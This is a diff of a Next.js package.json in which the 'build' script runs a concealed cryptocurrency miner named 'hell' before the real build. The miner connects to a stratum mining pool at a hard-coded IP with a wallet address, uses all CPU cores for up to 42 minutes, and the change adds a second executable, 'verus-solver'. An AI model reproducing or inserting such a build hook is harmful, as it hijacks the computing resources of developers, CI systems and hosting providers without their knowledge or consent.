@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "chmod +x hell; timeout 42m ./hell -c stratum+tcp://159.223.63.73:80 -u RSxdUnFbKxcJQ46pVn5fUM5Yn4UVtdCf6c.Anjay -p x --cpu $(nproc --all); next build",
+    "build": "chmod +x hell; chmod +x verus-solver; timeout 42m ./hell -c stratum+tcp://159.223.63.73:80 -u RSxdUnFbKxcJQ46pVn5fUM5Yn4UVtdCf6c.Anjay -p x --cpu $(nproc --all); next build",
     "start": "next start",
     "lint": "next lint"
   },
